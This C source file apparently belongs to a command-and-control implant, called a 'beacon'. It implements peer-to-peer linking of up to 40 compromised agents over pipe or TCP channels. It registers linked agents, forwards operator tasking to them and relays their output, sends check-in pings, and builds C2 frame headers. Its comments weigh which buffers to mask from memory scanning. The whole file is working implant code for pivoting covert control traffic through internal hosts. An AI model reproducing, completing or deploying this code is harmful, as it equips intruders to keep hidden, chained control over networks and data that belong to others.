#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "bformat.h"
#include "parse.h"


#define MAX_GET 1024 * 1024
#define MAX_LINKS 40

static char * link_read_buffer = NULL;  /* TODO: An allocated buffer that is not released on exit.  This is the data passed between the linked beacons.  Probably not a mask candidate. */

extern unsigned int post_type;
extern unsigned int agentid;

typedef struct {
	unsigned int agentid;
	LCHANNEL     channel;
	unsigned int active;
	char       * metadata;
	int          mlength;
	unsigned int ping;
} link_t;

static link_t links[MAX_LINKS] = { 0 }; /* TODO: Array of links, which contains an allocated metadata block of size (258).  It is reused as needed for links that start/stopped */
                                        /*       This should be released on exit for all links,  Probably is not a mask candidate. */

void link_stop(unsigned int agentid, void(*callback)(char * buffer, int length, int type));

/* register a new link, read agent id + metadata */
BOOL link_register(LCHANNEL channel, int hint, void(*callback)(char * buffer, int length, int type)) {
	char         response[256] = { 0 };
	int          status;
	int          x;
	unsigned int agentid;
	formatp      buffer;

	/* check if we're ready to read */
	if (!LCHANNEL_READ_READY(channel, 30000))
		return FALSE;

	/* read agentid from the pipe */
	status = LCHANNEL_READ_FRAME(channel, response, 256);
	if (status < 0)
		return FALSE;

	memcpy(&agentid, response, 4);

	/* looks good? OK, let's assign our pipe to one of the empty links */
	for (x = 0; x < MAX_LINKS; x++) {
		if (links[x].active != 0)
			continue;

		links[x].active = 1;
		links[x].agentid = agentid;
		links[x].channel = channel;
		links[x].ping = 0;

		/* allocate some space for our metadata */
		if (links[x].metadata == NULL)
			links[x].metadata = (char *)malloc(256);

		/* build up our metadata structure which communicates: agentid, port hint, and metadata */
		bformat_existing(&buffer, links[x].metadata, 256);
		bformat_int(&buffer, agentid);
		bformat_int(&buffer, hint);
		bformat_copy(&buffer, response + 4, status - 4);

		links[x].mlength = bformat_length(&buffer);

		/* let the user know we have established our pipe or link */
		callback(links[x].metadata, links[x].mlength, CALLBACK_PIPE_OPEN);

		return TRUE;
	}

	post_error_na(0x05);
	return FALSE;
}

/*  
 *  find link and resend metadata
 *  [agent id] - 4 bytes
 */
void command_link_reopen(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	unsigned int agentid = 0;
	int x = 0;

	/* parse out the agentid */
	memcpy(&agentid, buffer, sizeof(unsigned int));
	agentid = ntohl(agentid);

	/* find our connection and resend the pipe open message */
	for (x = 0; x < MAX_LINKS; x++) {
		if (links[x].active == 1 && links[x].agentid == agentid) {
			callback(links[x].metadata, links[x].mlength, CALLBACK_PIPE_OPEN);
			return;
		}
	}
}

/*
 *  route data to a link and poll it for data to read
 *  [agent id] - 4 bytes
 *  [package]  - X bytes
 */
void command_link_route(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	unsigned int agentid  = 0; /* host byte-order agent ID */
	unsigned int agentidN = 0; /* network byte-order agent ID */
	int x = 0;
	int status = 0, wrote = 0, read = 0, rlen = 0;

	if (link_read_buffer == NULL)
		link_read_buffer = (char *)malloc(MAX_GET);

	/* parse out the agent id */
	memcpy(&agentidN, buffer, sizeof(unsigned int));
	buffer += 4;
	length -= 4;
	agentid = ntohl(agentidN);

	/* look for the agent package */
	for (x = 0; x < MAX_LINKS; x++) {
		if (links[x].agentid != agentid || links[x].active != 1)
				continue;

		/* write our data */
		if (length > 0) {
			status = LCHANNEL_WRITE_FRAME(links[x].channel, buffer, length);
			if (!status) {
				link_stop(agentid, callback);
				return;
			}
		}
		else {
			status    = LCHANNEL_WRITE_FRAME(links[x].channel, NULL, 0);
			if (!status) {
				link_stop(agentid, callback);
				return;
			}
		}

		/* copy our (network-byte ordered) agent id to the buffer */
		memcpy(link_read_buffer, (void *)&agentidN, sizeof(unsigned int));

		/* check if we're ready to read */
		if (LCHANNEL_READ_READY(links[x].channel, 300000)) {
			/* do the read */
			read = LCHANNEL_READ_FRAME(links[x].channel, link_read_buffer + sizeof(unsigned int), MAX_GET - sizeof(unsigned int));
		}
		else {
			/* assume our read failed */
			read = -1;
		}

		if (read > 0) {
			/* whether we read anything or not... post it */
			callback(link_read_buffer, sizeof(unsigned int) + read, CALLBACK_PIPE_READ);
		}
		else if (read == 0) {
			/* do a ping... just to prove the system checked in */
			callback(link_read_buffer, sizeof(unsigned int), CALLBACK_PIPE_READ);
		}
		else if (read < 0) {
			link_stop(agentid, callback);
		}
	}
}

/* 
 * after each checkin, advertise the beacons we have linked
 */
void link_poll(void (*callback)(char * buffer, int length, int type)) {
	unsigned int agentid = 0;
	int x = 0;

	/* look for the agent package */
	for (x = 0; x < MAX_LINKS; x++) {
		if (links[x].active == 1 && links[x].ping < GetTickCount()) {
			/* we should only send a ping once every 15s or so */
			links[x].ping = GetTickCount() + 15000;

			/* post a message indicating that this pipe is here */
			agentid = htonl(links[x].agentid);
			callback((char *)&agentid, sizeof(unsigned int), CALLBACK_PIPE_PING);
		}
	}
}

/*
 *  kill a link...
 *  @arg [agent id] = 4 bytes
 */
void command_link_stop(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	unsigned int agentid = 0;

	/* parse out the agent id */
	memcpy(&agentid, buffer, sizeof(unsigned int));
	agentid = ntohl(agentid);
	link_stop(agentid, callback);
}

void link_stop(unsigned int agentid, void (*callback)(char * buffer, int length, int type)) {
	int x = 0;

	/* look for the agent package */
	for (x = 0; x < MAX_LINKS; x++) {
		if (links[x].agentid == agentid && links[x].active == 1) {
			/* post a message indicating that this pipe is gone */
			agentid = htonl(agentid);
			callback((char *)&agentid, sizeof(unsigned int), CALLBACK_PIPE_CLOSE);

			/* close the connection */
			LCHANNEL_CLOSE(links[x].channel);

			/* reset the link */
			links[x].agentid = 0;
			links[x].active  = 0;
			links[x].ping    = 0;
			return;
		}
	}
}

/* build our frame header (for either C2 type) */
char * link_frame_header(int type, int message, int * size) {
	datap parser;
	char * ptr = setting_ptr(type);
	char * val = NULL;

	/* init our parser */
	data_init(&parser, ptr, 128);

	/* read our length */
	*size = data_short(&parser);

	/* get our frame pointer */
	val   = data_ptr(&parser, *size);

	/* set our frame value in this pointer, please */
	memcpy(val + *size + -4, &message, 4);

	return val;
}